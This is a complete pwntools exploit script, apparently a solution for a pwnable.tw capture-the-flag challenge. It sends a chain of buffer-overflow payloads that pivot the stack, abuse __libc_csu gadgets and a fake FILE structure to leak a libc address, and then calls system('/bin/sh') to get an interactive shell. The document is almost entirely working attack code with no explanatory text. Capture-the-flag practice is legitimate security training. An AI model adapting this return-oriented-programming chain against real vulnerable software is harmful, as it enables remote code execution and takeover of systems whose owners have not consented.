from pwn import *

context.arch = 'amd64'
context.os = 'linux'

r = remote('chall.pwnable.tw', 10402)

main_gets = 0x40053e
leave_ret = 0x400554
safe_area = 0x601400
fake_stack = 0x601800
libcsu_lower = 0x4005a0
libcsu_higher = 0x4005ba
fake_fp = flat([0xfbad2084, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0xffffffffffffffff])
fake_fp_addr = 0x601460

payload1 = b'A' * 0x10 + p64(fake_stack + 0x10) + p64(main_gets)
r.sendline(payload1)

payload2 = b'A' * 0x10 + p64(safe_area + 0x10) + p64(main_gets)
r.sendline(payload2)

payload3 = b'A' * 0x10 + p64(0x601770) + p64(main_gets)
payload3 += p64(0x6017b0) + p64(main_gets)
payload3 += p64(0x6017c0) + p64(main_gets)
payload3 += p64(0x6017e0) + p64(main_gets)
payload3 += p64(0x601808) + p64(main_gets)
payload3 += fake_fp + b'/bin/sh\0'
r.sendline(payload3)

fake_rbx = 0x6a76b
fake_rbp = fake_rbx + 1
fake_r13 = 0x8
fake_r14 = 0x601408
fake_r15 = fake_fp_addr

payload4 = b'A' * 0x10 + p64(safe_area + 0x20) + p64(leave_ret) + p64(libcsu_higher) + p64(fake_rbx) + p64(fake_rbp)
r.sendline(payload4)

payload5 = p64(fake_r13) + p64(fake_r14) + p64(safe_area + 0x30) + p64(leave_ret)
r.sendline(payload5)

payload6 = p64(fake_r15) + p64(libcsu_lower) + p64(safe_area + 0x40) + p64(leave_ret)
r.sendline(payload6)

payload7 = p64(0x601800) + b'A' * 8 + p64(safe_area + 0x50) + p64(leave_ret)
r.sendline(payload7)

payload8 = p64(main_gets) + b'A' * 0x8 + p64(0x601778) + p64(leave_ret)
r.sendline(payload8)

libc_leak = r.recv(8)
libc_base = u64(libc_leak) - 0x3c38e0
log.success('libc base --> ' + hex(libc_base))

system = libc_base + 0x45390
pop_rdi_ret = libc_base + 0x21102
shell_addr = 0x6014e0

payload9 = p64(0) + p64(pop_rdi_ret) + p64(shell_addr) + p64(system)
r.sendline(payload9)

r.interactive()
